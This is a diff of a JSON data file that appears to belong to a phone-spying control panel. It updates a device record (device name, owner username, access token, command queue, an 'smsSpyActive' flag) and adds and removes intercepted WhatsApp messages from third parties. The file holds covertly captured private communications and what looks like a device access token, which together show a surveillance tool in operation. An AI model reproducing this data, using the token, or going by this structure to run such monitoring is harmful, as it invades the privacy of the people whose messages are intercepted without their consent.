@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776003415457,
+    "lastSeen": 1776003427295,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨: ~ 𝒜𝓋𝑒𝓁𝓎𝓃 𝒢𝓇𝒾𝓈𝑒𝓁𝒹𝒶 𝒱𝒶𝓁𝑒𝓇𝓎",
+        "content": "yeuu",
+        "time": "12/04 21:17",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003429760
+      },
       {
         "appName": "WhatsApp",
         "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
@@ -4115,14 +4123,6 @@
         "time": "12/04 00:13",
         "pkg": "com.whatsapp",
         "receivedAt": 1775927636247
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝟐𝟑 𝐕𝐄𝐋𝐂𝐘𝐄𝐈: ~ kkdap catalyst/reality",
-        "content": "@⁨~regàcmèldlv/𝐂𝐈𝐓𝐄𝐍𝟗/ROR⁩",
-        "time": "12/04 00:13",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775927636106
       }
     ],
     "galleryPhotos": [],
